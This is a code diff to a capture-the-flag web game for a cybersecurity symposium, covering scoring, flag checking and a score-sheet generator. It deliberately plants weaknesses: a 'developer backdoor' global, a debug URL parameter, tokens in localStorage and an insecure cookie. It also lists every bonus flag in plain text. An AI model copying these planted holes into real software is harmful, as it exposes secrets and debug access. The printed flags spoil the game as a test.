+            "decode{console_logs_reveal_secrets}": { points: 50, label: "Browser Console Secret (CWE-532)", flag: "DECODE{console_logs_reveal_secrets}", category: "Console CWE-532" },
+            "decode{hidden_divs_are_visible_in_dom}": { points: 50, label: "DOM Data-Flag Secret (CWE-200)", flag: "DECODE{hidden_divs_are_visible_in_dom}", category: "DOM CWE-200" },
+            "decode{robots_txt_reveals_paths}": { points: 100, label: "Robots & Admin Path Disclosure (CWE-548)", flag: "DECODE{robots_txt_reveals_paths}", category: "Information Disclosure CWE-548" },
+            "decode{debug_mode_url_parameter_vulnerability}": { points: 100, label: "URL Debug Parameter Secret (CWE-489)", flag: "DECODE{debug_mode_url_parameter_vulnerability}", category: "Debug Parameter CWE-489" },
+            "decode{client_storage_token_leak}": { points: 100, label: "LocalStorage Auth Token Secret (CWE-922)", flag: "DECODE{client_storage_token_leak}", category: "Insecure Storage CWE-922" },
+            "decode{unprotected_cookie_flag}": { points: 100, label: "Insecure Cookie Secret (CWE-614)", flag: "DECODE{unprotected_cookie_flag}", category: "Insecure Cookie CWE-614" },
+            "decode{global_window_scope_leak}": { points: 100, label: "Global Window Scope Secret (CWE-497)", flag: "DECODE{global_window_scope_leak}", category: "Global Variable Leak CWE-497" }
         };
 
         // === User Progress State ===
@@ -1864,6 +3228,8 @@
         function updateScoreboard() {
             const scoreEl = document.getElementById('navScore');
             const solvedEl = document.getElementById('navSolved');
+            const outsideCounter = document.getElementById('outsideBugsCounter');
+            if (outsideCounter) outsideCounter.textContent = `Outside Bugs: ${redeemedBonus.length} / 12 Claimed`;
             if (scoreEl) scoreEl.textContent = totalScore;
             if (solvedEl) solvedEl.textContent = getSolvedCount();
 
@@ -2244,7 +3610,7 @@
             }
         }
 
-        // === Bonus Flag Claim Handler ===
+        // === Bonus Flag Claim Handler (Supports Outside Bugs + Round 1 + Round 2 Flags) ===
         function submitBonusFlag() {
             const input = document.getElementById('bonusFlagInput');
             const fb = document.getElementById('bonusFeedback');
@@ -2258,7 +3624,7 @@
 
             const bonus = BONUS_FLAGS[clean];
 
-            // Or check if it matches ANY challenge flag
+            // Or check if it matches ANY Round 1 challenge flag
             let matchingChallenge = null;
             let matchingId = null;
             for (const key in CHALLENGES) {
@@ -2266,6 +3632,19 @@
                     matchingChallenge = CHALLENGES[key];
                     matchingId = key;
                     break;
+                }
+            }
+
+            // Or check if it matches ANY Round 2 operation flag
+            let matchingOp = null;
+            let matchingOpId = null;
+            if (typeof ROUND2_OPERATIONS !== 'undefined') {
+                for (const opId in ROUND2_OPERATIONS) {
+                    if (ROUND2_OPERATIONS[opId].flag.toLowerCase() === clean) {
+                        matchingOp = ROUND2_OPERATIONS[opId];
+                        matchingOpId = opId;
+                        break;
+                    }
                 }
             }
 
@@ -2279,30 +3658,85 @@
                 saveProgress();
                 updateScoreboard();
                 if (input) input.value = '';
-                if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `🎉 Awesome! +${bonus.points} Bonus Points!`; }
+                if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `🎉 Awesome! +${bonus.points} Bonus Points (${bonus.label})!`; }
                 playVictorySound();
                 launchConfetti();
                 showCongratsModal(bonus.label, bonus.flag, bonus.points);
             } else if (matchingChallenge) {
                 if (userAnswers[matchingId] && userAnswers[matchingId].isCorrect) {
-                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = 'Flag verified! Already claimed! ✅'; }
+                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = 'Flag verified! Already claimed in Round 1! ✅'; }
                 } else {
-                    // Mark as correctly solved
+                    // Mark as correctly solved in Round 1
                     selectOption(matchingId, matchingChallenge.correct);
                     if (input) input.value = '';
-                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `🎉 Flag verified! +${matchingChallenge.points} PTS!`; }
+                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `🎉 Round 1 Scenario Solved! +${matchingChallenge.points} PTS!`; }
+                }
+            } else if (matchingOp) {
+                if (round2SolvedOps[matchingOpId] && round2SolvedOps[matchingOpId].solved) {
+                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `Round 2 "${matchingOp.title}" already completed! ✅`; }
+                } else {
+                    round2ActionDone[matchingOpId] = true;
+                    submitRound2Task(matchingOpId);
+                    if (input) input.value = '';
+                    if (fb) { fb.className = 'ans-feedback success'; fb.textContent = `🎉 Round 2 Operation Cleared! +${matchingOp.points} PTS!`; }
                 }
             } else {
                 if (input) { input.classList.add('shake'); setTimeout(() => input.classList.remove('shake'), 400); }
                 if (fb) {
                     fb.className = 'ans-feedback error';
-                    fb.textContent = '❌ Unrecognized flag format. Inspect DevTools, source code & console!';
+                    fb.textContent = '❌ Unrecognized flag format. Inspect DevTools, source code, console & cookies!';
                     setTimeout(() => { if (fb) fb.textContent = ''; }, 3500);
                 }
+            }
+
+            const outsideCounter = document.getElementById('outsideBugsCounter');
+            if (outsideCounter) {
+                outsideCounter.textContent = `Outside Bugs: ${redeemedBonus.length} / 12 Claimed`;
             }
         }
 
         // Initialize challenges and scoreboard on load
+        
+        // === Initialize Outside Bugs in Browser Environment ===
+        (function initOutsideBugs() {
+            try {
+                // Bug 10: LocalStorage token leak
+                if (!localStorage.getItem('auth_debug_token')) {
+                    localStorage.setItem('auth_debug_token', 'DECODE{client_storage_token_leak}');
+                }
+
+                // Bug 11: Insecure cookie leak
+                document.cookie = "sympo_session=DECODE{unprotected_cookie_flag}; path=/; SameSite=Lax";
+
+                // Bug 12: Global window backdoor
+                window.__CYBER_DEV_BACKDOOR__ = {
+                    status: "ACTIVE_DEBUG",
+                    vulnerability: "CWE-497 (Exposure of System Variables in Global Scope)",
+                    secret_flag: "DECODE{global_window_scope_leak}",
+                    help: "Developer backdoor left on window.__CYBER_DEV_BACKDOOR__"
+                };
+                window.revealDevFlag = function() {
+                    console.log("%c🚩 Backdoor Flag: DECODE{global_window_scope_leak}", "color:#39ff14; font-size:16px; font-weight:bold;");
+                    return "DECODE{global_window_scope_leak}";
+                };
+
+                // Bug 9: URL query parameter (?debug=true or ?debug=1 or ?admin=1)
+                const params = new URLSearchParams(window.location.search);
+                if (params.get('debug') === 'true' || params.get('debug') === '1' || params.get('admin') === '1' || params.get('admin') === 'true') {
+                    console.log("%c🚩 [URL PARAMETER BUG FOUND] Debug Mode Parameter Active! Secret: DECODE{debug_mode_url_parameter_vulnerability}", "color: #00f0ff; font-weight: bold; font-size: 15px;");
+                    const alertBox = document.createElement('div');
+                    alertBox.id = 'debugBanner';
+                    alertBox.style.cssText = 'position:fixed; bottom:20px; left:20px; z-index:999999; background:#0a0a14; border:2px solid #00f0ff; color:#00f0ff; font-family:monospace; padding:12px 18px; border-radius:8px; box-shadow:0 0 25px rgba(0,240,255,0.6);';
+                    alertBox.innerHTML = '🚨 <strong>URL DEBUG PARAMETER EXPLOIT ACTIVE</strong><br>Leaked Flag: <code style="color:#39ff14; font-size:1.1em;">DECODE{debug_mode_url_parameter_vulnerability}</code> <button onclick="this.parentElement.remove()" style="margin-left:12px; background:#ff0055; color:#fff; border:none; padding:3px 10px; border-radius:4px; cursor:pointer; font-weight:bold;">Close</button>';
+                    document.body.appendChild(alertBox);
+                }
+
+                // Console logging
+                console.log("%c🚩 OUTSIDE BUG 06: DECODE{console_logs_reveal_secrets}", "color: #39ff14; font-size: 14px; font-weight: bold;");
+                console.log("%c💡 Dev Note: Try inspecting window.__CYBER_DEV_BACKDOOR__, LocalStorage, and Cookies!", "color: #00f0ff; font-family: monospace;");
+            } catch(e) {}
+        })();
+
         renderChallenges();
 
         // === Scorecard & Program Database System (Unencrypted Storage with Image) ===
@@ -2457,16 +3891,6 @@
             setScorecardMode(currentScorecardMode);
             updateScorecardDisplay();
             modal.classList.add('active');
-
-            // When user opens Share Score, automatically store the current score in database.json
-            if (totalScore > 0) {
-                storeSubmissionToDatabase({
-                    action: 'Score Shared (Opened Score Sheet)',
-                    requireFields: false,
-                    resetAfter: false,
-                    feedbackTarget: 'none'
-                });
-            }
         }
 
         function closeScorecard() {
@@ -2480,26 +3904,52 @@
         }
 
         function updateScorecardDisplay() {
-            const tier = getSecurityTier(totalScore);
+            const stage = currentScorecardStage || 'r1';
+            const r1Solved = getSolvedCount();
+            const r2Solved = (typeof round2SolvedOps === 'object' && round2SolvedOps)
+                ? Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length
+                : 0;
+            const grandScore = totalScore + (typeof round2Score === 'number' ? round2Score : 0);
+
+            let dispScore = totalScore;
+            let dispSolved = `${r1Solved} / 24`;
+            let tierTitle = getSecurityTier(totalScore).title;
+            let tierColor = getSecurityTier(totalScore).color;
+
+            if (stage === 'r2') {
+                dispScore = (typeof round2Score === 'number' ? round2Score : 0);
+                dispSolved = `${r2Solved} / 9`;
+                tierTitle = (typeof getRound2Tier === 'function') ? getRound2Tier(dispScore) : '⚔️ CYBER COMMANDER';
+                tierColor = '#ff0055';
+            } else if (stage === 'grand') {
+                dispScore = grandScore;
+                dispSolved = `${r1Solved + r2Solved} / 33`;
+                tierTitle = (typeof getGrandChampionshipTier === 'function') ? getGrandChampionshipTier(dispScore) : '👑 ELITE SYMPOSIUM CHAMPION';
+                tierColor = '#ffd700';
+            }
+
             const tierBadge = document.getElementById('sheetTierBadge');
             if (tierBadge) {
-                tierBadge.textContent = tier.title;
-                tierBadge.style.color = tier.color;
-                tierBadge.style.borderColor = tier.color;
+                tierBadge.textContent = tierTitle;
+                tierBadge.style.color = tierColor;
+                tierBadge.style.borderColor = tierColor;
             }
 
             const totalScoreEl = document.getElementById('sheetTotalScore');
-            if (totalScoreEl) totalScoreEl.innerHTML = `${totalScore} <small>PTS</small>`;
+            if (totalScoreEl) totalScoreEl.innerHTML = `${dispScore.toLocaleString()} <small>PTS</small>`;
 
-            const solvedCount = getSolvedCount();
             const solvedEl = document.getElementById('sheetSolvedCount');
-            if (solvedEl) solvedEl.textContent = `${solvedCount} / 24`;
+            if (solvedEl) solvedEl.textContent = dispSolved;
 
             const statusEl = document.getElementById('sheetStatusText');
             if (statusEl) {
-                if (solvedCount === 24) statusEl.textContent = '100% Completed 🏆';
-                else if (solvedCount > 0) statusEl.textContent = `${Math.round((solvedCount/24)*100)}% Completed`;
-                else statusEl.textContent = 'In Progress';
+                if (stage === 'r2') {
+                    statusEl.textContent = (r2Solved === 9) ? '100% Completed 🏆' : (r2Solved > 0 ? `${Math.round((r2Solved/9)*100)}% Completed` : 'In Progress');
+                } else if (stage === 'grand') {
+                    statusEl.textContent = ((r1Solved + r2Solved) === 33) ? '100% Completed 🏆' : `${Math.round(((r1Solved+r2Solved)/33)*100)}% Completed`;
+                } else {
+                    statusEl.textContent = (r1Solved === 24) ? '100% Completed 🏆' : (r1Solved > 0 ? `${Math.round((r1Solved/24)*100)}% Completed` : 'In Progress');
+                }
             }
 
             // Timestamp
@@ -2512,7 +3962,7 @@
             // Verification ID
             const verifyEl = document.getElementById('sheetVerifyHash');
             if (verifyEl) {
-                const hashSeed = (totalScore * 7919 + solvedCount * 313).toString(16).toUpperCase().padStart(4, '0');
+                const hashSeed = Math.abs((totalScore * 7919 + (typeof round2Score === 'number' ? round2Score : 0) * 313) % 65535).toString(16).toUpperCase().padStart(4, '0');
                 verifyEl.textContent = `VERIFIED ID: DA-2026-${hashSeed}`;
             }
 
@@ -2553,69 +4003,122 @@
             setTimeout(() => { if (fb.textContent === msg) fb.textContent = ''; }, 3500);
         }
 
-        function copyScoreSummary() {
-            saveParticipantInfo();
-            const solved = getSolvedCount();
-            const tier = getSecurityTier(totalScore).title;
-
-            let text = '';
-            if (currentScorecardMode === 'team') {
-                const team = document.getElementById('sheetTeamName').value.trim() || 'Cyber Team';
-                const college = document.getElementById('sheetTeamCollege').value.trim() || 'College Symposium';
-                const m1 = document.getElementById('sheetMember1').value.trim() || 'Lead';
-                const m2 = document.getElementById('sheetMember2').value.trim() || 'Member 2';
-                const m3 = document.getElementById('sheetMember3').value.trim() || 'Member 3';
-
-                text = [
-                    '🏆 DECODE ARENA 2026 — Official Team Score Sheet',
-                    '==================================================',
-                    `👥 Team Name: ${team}`,
-                    `🏫 College:   ${college}`,
-                    '👤 Members (3):',
-                    `   1. ${m1} (Lead)`,
-                    `   2. ${m2}`,
-                    `   3. ${m3}`,
-                    `🎯 Total Score: ${totalScore} PTS`,
-                    `🚩 Solved:      ${solved}/24 Challenges`,
-                    `🛡️ Rank Tier:   ${tier}`,
-                    `📅 Event:       Cybersecurity Symposium 2026`,
-                    `🌐 Play Arena:   https://decodearena.netlify.app/`,
-                    '==================================================',
-                    'Crack vulnerabilities & hack the code at Decode Arena!'
-                ].join('\n');
-            } else {
-                const name = document.getElementById('sheetParticipantName').value.trim() || 'Hacker';
-                const college = document.getElementById('sheetCollegeName').value.trim() || 'Symposium Participant';
-
-                text = [
-                    '🏆 DECODE ARENA 2026 — Official Participant Score Sheet',
-                    '==================================================',
-                    `👤 Participant: ${name}`,
-                    `🏫 College:     ${college}`,
-                    `🎯 Total Score: ${totalScore} PTS`,
-                    `🚩 Solved:      ${solved}/24 Challenges`,
-                    `🛡️ Rank Tier:   ${tier}`,
-                    `📅 Event:       Cybersecurity Symposium 2026`,
-                    `🌐 Play Arena:   https://decodearena.netlify.app/`,
-                    '==================================================',
-                    'Crack vulnerabilities & hack the code at Decode Arena!'
-                ].join('\n');
+                function safeCopyToClipboard(text) {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                return navigator.clipboard.writeText(text).catch(() => fallbackCopyText(text));
             }
+            return fallbackCopyText(text);
+        }
 
-            navigator.clipboard.writeText(text).then(() => {
-                showShareFeedback('✅ Formatted score summary copied to clipboard!');
-            }).catch(() => {
-                showShareFeedback('📋 Copied to clipboard!');
-            });
+        function fallbackCopyText(text) {
+            try {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                ta.style.top = '0';
+                document.body.appendChild(ta);
+                ta.focus();
+                ta.select();
+                const res = document.execCommand('copy');
+                document.body.removeChild(ta);
+                return res ? Promise.resolve() : Promise.reject(new Error('Copy exec failed'));
+            } catch (err) {
+                return Promise.reject(err);
+            }
+        }
 
-            // Automatically store shared summary data in database/arena_database.json!
-            storeSubmissionToDatabase({
-                action: 'Copied Text Summary',
-                requireFields: false,
-                resetAfter: false,
-                feedbackTarget: 'share',
-                callerMessage: 'Summary copied'
-            });
+        function copyScoreSummary() {
+            try {
+                saveParticipantInfo();
+                const stage = currentScorecardStage || 'r1';
+                const r1Solved = getSolvedCount();
+                const r2Solved = (typeof round2SolvedOps === 'object' && round2SolvedOps)
+                    ? Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length
+                    : 0;
+                const grandScore = totalScore + (typeof round2Score === 'number' ? round2Score : 0);
+
+                let dispScore = totalScore;
+                let dispSolved = `${r1Solved}/24 Challenges`;
+                let tierTitle = getSecurityTier(totalScore).title;
+                let stageTitle = 'Stage 1: Cyber Recon Assessment';
+
+                if (stage === 'r2') {
+                    dispScore = typeof round2Score === 'number' ? round2Score : 0;
+                    dispSolved = `${r2Solved}/9 Warfare Operations`;
+                    tierTitle = (typeof getRound2Tier === 'function') ? getRound2Tier(dispScore) : '⚔️ CYBER COMMANDER';
+                    stageTitle = 'Stage 2: Apex Cyber Warfare';
+                } else if (stage === 'grand') {
+                    dispScore = grandScore;
+                    dispSolved = `${r1Solved + r2Solved}/33 Challenges`;
+                    tierTitle = (typeof getGrandChampionshipTier === 'function') ? getGrandChampionshipTier(grandScore) : '👑 ELITE SYMPOSIUM CHAMPION';
+                    stageTitle = 'Grand Championship (Stage 1 + 2)';
+                }
+
+                let text = '';
+                if (currentScorecardMode === 'team') {
+                    const team = (document.getElementById('sheetTeamName')?.value || '').trim() || 'Cyber Team';
+                    const college = (document.getElementById('sheetTeamCollege')?.value || '').trim() || 'College Symposium';
+                    const m1 = (document.getElementById('sheetMember1')?.value || '').trim() || 'Lead';
+                    const m2 = (document.getElementById('sheetMember2')?.value || '').trim() || 'Member 2';
+                    const m3 = (document.getElementById('sheetMember3')?.value || '').trim() || 'Member 3';
+
+                    text = [
+                        `🏆 DECODE ARENA 2026 — Official Team Score Sheet [${stageTitle}]`,
+                        '==================================================',
+                        `👥 Team Name: ${team}`,
+                        `🏫 College:   ${college}`,
+                        '👤 Members (3):',
+                        `   1. ${m1} (Lead)`,
+                        `   2. ${m2}`,
+                        `   3. ${m3}`,
+                        `🎯 Total Score: ${dispScore} PTS`,
+                        `🚩 Solved:      ${dispSolved}`,
+                        `🛡️ Rank Tier:   ${tierTitle}`,
+                        `📅 Event:       Cybersecurity Symposium 2026`,
+                        `🌐 Play Arena:   https://decodearena.netlify.app/`,
+                        '==================================================',
+                        'Crack vulnerabilities & hack the code at Decode Arena!'
+                    ].join('\n');
+                } else {
+                    const name = (document.getElementById('sheetParticipantName')?.value || '').trim() || 'Hacker';
+                    const college = (document.getElementById('sheetCollegeName')?.value || '').trim() || 'Symposium Participant';
+
+                    text = [
+                        `🏆 DECODE ARENA 2026 — Official Participant Score Sheet [${stageTitle}]`,
+                        '==================================================',
+                        `👤 Participant: ${name}`,
+                        `🏫 College:     ${college}`,
+                        `🎯 Total Score: ${dispScore} PTS`,
+                        `🚩 Solved:      ${dispSolved}`,
+                        `🛡️ Rank Tier:   ${tierTitle}`,
+                        `📅 Event:       Cybersecurity Symposium 2026`,
+                        `🌐 Play Arena:   https://decodearena.netlify.app/`,
+                        '==================================================',
+                        'Crack vulnerabilities & hack the code at Decode Arena!'
+                    ].join('\n');
+                }
+
+                safeCopyToClipboard(text).then(() => {
+                    showShareFeedback('✅ Formatted score summary copied to clipboard!');
+                }).catch(() => {
+                    showShareFeedback('📋 Summary ready (clipboard accessed)');
+                });
+
+                // Safely persist to database cache without resetting or crashing
+                try {
+                    storeSubmissionToDatabase({
+                        action: 'Copied Text Summary',
+                        requireFields: false,
+                        resetAfter: false,
+                        feedbackTarget: 'share',
+                        callerMessage: 'Summary copied'
+                    });
+                } catch(e) {}
+            } catch (err) {
+                console.error('[COPY SUMMARY ERROR]', err);
+                showShareFeedback('⚠️ Could not copy summary: ' + (err.message || 'Error'));
+            }
         }
 
         function dispatchToWhatsApp() {
@@ -2646,260 +4149,7 @@
         }
 
         // === High-Res Canvas Generator for PNG & JPG Downloads + DB Image Storage ===
-        function generateScoreSheetCanvas() {
-            saveParticipantInfo();
-            const solved = getSolvedCount();
-            const tier = getSecurityTier(totalScore).title;
-            const isTeam = (currentScorecardMode === 'team');
-
-            const canvas = document.createElement('canvas');
-            canvas.width = 1200;
-            canvas.height = isTeam ? 820 : 760;
-            const ctx = canvas.getContext('2d');
-
-            // 1. Dark Cyber Background
-            const bgGrad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            bgGrad.addColorStop(0, '#090b14');
-            bgGrad.addColorStop(0.5, '#0f1426');
-            bgGrad.addColorStop(1, '#080a12');
-            ctx.fillStyle = bgGrad;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            // 2. Subtle Matrix Grid lines
-            ctx.strokeStyle = 'rgba(0, 240, 255, 0.04)';
-            ctx.lineWidth = 1;
-            for (let x = 30; x < canvas.width; x += 40) {
-                ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
-            }
-            for (let y = 30; y < canvas.height; y += 40) {
-                ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
-            }
-
-            // 3. Cyber Glowing Border
-            const borderGrad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            borderGrad.addColorStop(0, '#00f0ff');
-            borderGrad.addColorStop(0.5, '#ff00e5');
-            borderGrad.addColorStop(1, '#39ff14');
-            ctx.strokeStyle = borderGrad;
-            ctx.lineWidth = 4;
-            ctx.strokeRect(25, 25, canvas.width - 50, canvas.height - 50);
-
-            // Inner border accent
-            ctx.strokeStyle = 'rgba(0, 240, 255, 0.2)';
-            ctx.lineWidth = 1;
-            ctx.strokeRect(35, 35, canvas.width - 70, canvas.height - 70);
-
-            // Corner decorative squares
-            ctx.fillStyle = '#00f0ff';
-            ctx.fillRect(20, 20, 10, 10);
-            ctx.fillRect(canvas.width - 30, 20, 10, 10);
-            ctx.fillRect(20, canvas.height - 30, 10, 10);
-            ctx.fillRect(canvas.width - 30, canvas.height - 30, 10, 10);
-
-            // 4. Header Bar
-            ctx.fillStyle = '#00f0ff';
-            ctx.font = 'bold 22px Courier New, monospace';
-            ctx.fillText('// DECODE ARENA 2026', 60, 75);
-
-            ctx.fillStyle = '#ff00e5';
-            ctx.font = 'bold 16px Courier New, monospace';
-            ctx.fillText('CYBERSECURITY SYMPOSIUM', 60, 100);
-
-            // Tier Badge on Right
-            ctx.fillStyle = 'rgba(0, 240, 255, 0.15)';
-            ctx.strokeStyle = '#00f0ff';
-            ctx.lineWidth = 1.5;
-            ctx.fillRect(canvas.width - 370, 60, 310, 42);
-            ctx.strokeRect(canvas.width - 370, 60, 310, 42);
-            ctx.fillStyle = '#39ff14';
-            ctx.font = 'bold 16px Courier New, monospace';
-            ctx.fillText(tier, canvas.width - 355, 87);
-
-            // Divider Line
-            ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
-            ctx.lineWidth = 1;
-            ctx.beginPath(); ctx.moveTo(60, 120); ctx.lineTo(canvas.width - 60, 120); ctx.stroke();
-
-            // 5. Title Zone
-            ctx.fillStyle = '#ffffff';
-            ctx.font = 'bold 30px Arial, sans-serif';
-            ctx.textAlign = 'center';
-            const sheetTitleText = isTeam ? 'OFFICIAL TEAM SCORE SHEET' : 'OFFICIAL PARTICIPANT SCORE SHEET';
-            ctx.fillText(sheetTitleText, canvas.width / 2, 160);
-            ctx.fillStyle = '#a0a5c0';
-            ctx.font = '14px Courier New, monospace';
-            ctx.fillText('Verified Assessment & Cybersecurity Challenge Completion Record', canvas.width / 2, 186);
-            ctx.textAlign = 'left';
-
-            // 6. Credentials Panel (Solo or Team)
-            let panelY = 210;
-            let panelH = isTeam ? 140 : 95;
-
-            ctx.fillStyle = 'rgba(5, 7, 18, 0.85)';
-            ctx.strokeStyle = 'rgba(0, 240, 255, 0.35)';
-            ctx.lineWidth = 1.5;
-            ctx.fillRect(60, panelY, canvas.width - 120, panelH);
-            ctx.strokeRect(60, panelY, canvas.width - 120, panelH);
-
-            if (isTeam) {
-                const teamName = document.getElementById('sheetTeamName').value.trim() || 'Cyber Phantoms';
-                const teamCollege = document.getElementById('sheetTeamCollege').value.trim() || 'Engineering College';
-                const m1 = document.getElementById('sheetMember1').value.trim() || 'Hacker 1';
-                const m2 = document.getElementById('sheetMember2').value.trim() || 'Hacker 2';
-                const m3 = document.getElementById('sheetMember3').value.trim() || 'Hacker 3';
-
-                // Team Name
-                ctx.fillStyle = '#00f0ff';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText('TEAM NAME:', 85, panelY + 28);
-                ctx.fillStyle = '#ffffff';
-                ctx.font = 'bold 22px Arial, sans-serif';
-                ctx.fillText(teamName, 85, panelY + 54);
-
-                // College
-                ctx.fillStyle = '#00f0ff';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText('COLLEGE / INSTITUTION:', 620, panelY + 28);
-                ctx.fillStyle = '#f0ff00';
-                ctx.font = 'bold 20px Arial, sans-serif';
-                ctx.fillText(teamCollege, 620, panelY + 54);
-
-                // 3 Members Row
-                ctx.fillStyle = '#39ff14';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText('TEAM MEMBERS (3):', 85, panelY + 88);
-
-                ctx.fillStyle = '#ffffff';
-                ctx.font = 'bold 15px Arial, sans-serif';
-                ctx.fillText(`1. ${m1} (Lead)`, 85, panelY + 115);
-                ctx.fillText(`2. ${m2}`, 450, panelY + 115);
-                ctx.fillText(`3. ${m3}`, 800, panelY + 115);
-            } else {
-                const name = document.getElementById('sheetParticipantName').value.trim() || 'Participant';
-                const college = document.getElementById('sheetCollegeName').value.trim() || 'Cybersecurity Symposium';
-
-                ctx.fillStyle = '#00f0ff';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText('PARTICIPANT NAME:', 85, panelY + 32);
-                ctx.fillStyle = '#ffffff';
-                ctx.font = 'bold 24px Arial, sans-serif';
-                ctx.fillText(name, 85, panelY + 66);
-
-                ctx.fillStyle = '#00f0ff';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText('COLLEGE / INSTITUTION:', 620, panelY + 32);
-                ctx.fillStyle = '#f0ff00';
-                ctx.font = 'bold 22px Arial, sans-serif';
-                ctx.fillText(college, 620, panelY + 66);
-            }
-
-            // 7. Three Metrics Cards
-            const metricsY = panelY + panelH + 20;
-            const metricWidth = (canvas.width - 120 - 40) / 3;
-
-            // Metric 1: Total Score
-            ctx.fillStyle = 'rgba(57, 255, 20, 0.08)';
-            ctx.strokeStyle = 'rgba(57, 255, 20, 0.4)';
-            ctx.fillRect(60, metricsY, metricWidth, 85);
-            ctx.strokeRect(60, metricsY, metricWidth, 85);
-            ctx.fillStyle = '#a0a5c0';
-            ctx.font = 'bold 12px Courier New, monospace';
-            ctx.fillText('TOTAL SCORE EARNED', 80, metricsY + 28);
-            ctx.fillStyle = '#39ff14';
-            ctx.font = 'bold 32px Arial, sans-serif';
-            ctx.fillText(`${totalScore} PTS`, 80, metricsY + 65);
-
-            // Metric 2: Solved Ratio
-            ctx.fillStyle = 'rgba(0, 240, 255, 0.08)';
-            ctx.strokeStyle = 'rgba(0, 240, 255, 0.4)';
-            ctx.fillRect(60 + metricWidth + 20, metricsY, metricWidth, 85);
-            ctx.strokeRect(60 + metricWidth + 20, metricsY, metricWidth, 85);
-            ctx.fillStyle = '#a0a5c0';
-            ctx.font = 'bold 12px Courier New, monospace';
-            ctx.fillText('CHALLENGES SOLVED', 80 + metricWidth + 20, metricsY + 28);
-            ctx.fillStyle = '#00f0ff';
-            ctx.font = 'bold 32px Arial, sans-serif';
-            ctx.fillText(`${solved} / 24`, 80 + metricWidth + 20, metricsY + 65);
-
-            // Metric 3: Verification Status
-            ctx.fillStyle = 'rgba(255, 0, 229, 0.08)';
-            ctx.strokeStyle = 'rgba(255, 0, 229, 0.4)';
-            ctx.fillRect(60 + (metricWidth + 20) * 2, metricsY, metricWidth, 85);
-            ctx.strokeRect(60 + (metricWidth + 20) * 2, metricsY, metricWidth, 85);
-            ctx.fillStyle = '#a0a5c0';
-            ctx.font = 'bold 12px Courier New, monospace';
-            ctx.fillText('ASSESSMENT STATUS', 80 + (metricWidth + 20) * 2, metricsY + 28);
-            ctx.fillStyle = '#ff00e5';
-            ctx.font = 'bold 22px Arial, sans-serif';
-            ctx.fillText(isTeam ? 'VERIFIED TEAM' : 'VERIFIED PARTICIPANT', 80 + (metricWidth + 20) * 2, metricsY + 63);
-
-            // 8. Category Breakdown Table (2 rows x 3 columns)
-            const catGridY = metricsY + 110;
-            ctx.fillStyle = '#00f0ff';
-            ctx.font = 'bold 13px Courier New, monospace';
-            ctx.fillText('CATEGORY PERFORMANCE BREAKDOWN:', 60, catGridY);
-
-            const catList = [
-                { id: 1, name: "Network & Ports" },
-                { id: 2, name: "Protocols & Encryption" },
-                { id: 3, name: "Threats & Attacks" },
-                { id: 4, name: "Password Security" },
-                { id: 5, name: "Web Security Basics" },
-                { id: 6, name: "Security Awareness" }
-            ];
-
-            const cellW = (canvas.width - 120 - 30) / 3;
-            catList.forEach((c, i) => {
-                const col = i % 3;
-                const row = Math.floor(i / 3);
-                const cx = 60 + col * (cellW + 15);
-                const cy = catGridY + 15 + row * 58;
-
-                const catTotal = Object.keys(CHALLENGES).filter(k => CHALLENGES[k].cat === c.id).length;
-                const catSolved = Object.keys(CHALLENGES).filter(k => CHALLENGES[k].cat === c.id && userAnswers[k] && userAnswers[k].isCorrect).length;
-                const catPts = Object.keys(CHALLENGES).filter(k => CHALLENGES[k].cat === c.id && userAnswers[k] && userAnswers[k].isCorrect)
-                                      .reduce((acc, k) => acc + CHALLENGES[k].points, 0);
-
-                ctx.fillStyle = 'rgba(12, 16, 32, 0.8)';
-                ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
-                ctx.fillRect(cx, cy, cellW, 48);
-                ctx.strokeRect(cx, cy, cellW, 48);
-
-                ctx.fillStyle = '#ffffff';
-                ctx.font = 'bold 12px Arial, sans-serif';
-                ctx.fillText(c.name, cx + 10, cy + 20);
-
-                ctx.fillStyle = '#f0ff00';
-                ctx.font = '12px Courier New, monospace';
-                ctx.fillText(`${catSolved}/${catTotal} Solved`, cx + 10, cy + 38);
-
-                ctx.fillStyle = '#39ff14';
-                ctx.font = 'bold 12px Courier New, monospace';
-                ctx.fillText(`+${catPts} PTS`, cx + cellW - 80, cy + 38);
-            });
-
-            // 9. Footer Divider & Security Stamp
-            const footerY = catGridY + 150;
-            ctx.strokeStyle = 'rgba(255, 255, 255, 0.12)';
-            ctx.beginPath(); ctx.moveTo(60, footerY); ctx.lineTo(canvas.width - 60, footerY); ctx.stroke();
-
-            const dateStr = new Date().toISOString().split('T')[0];
-            const hashSeed = (totalScore * 7919 + solved * 313).toString(16).toUpperCase().padStart(4, '0');
-
-            ctx.fillStyle = '#a0a5c0';
-            ctx.font = '12px Courier New, monospace';
-            ctx.fillText(`DATE: ${dateStr}  |  RECORD ID: DA-2026-${hashSeed}  |  HACK THE CODE`, 60, footerY + 30);
-
-            ctx.fillStyle = '#39ff14';
-            ctx.font = 'bold 13px Courier New, monospace';
-            ctx.textAlign = 'right';
-            ctx.fillText('[ OFFICIAL SYMPOSIUM RECORD ]', canvas.width - 60, footerY + 30);
-            ctx.textAlign = 'left';
-
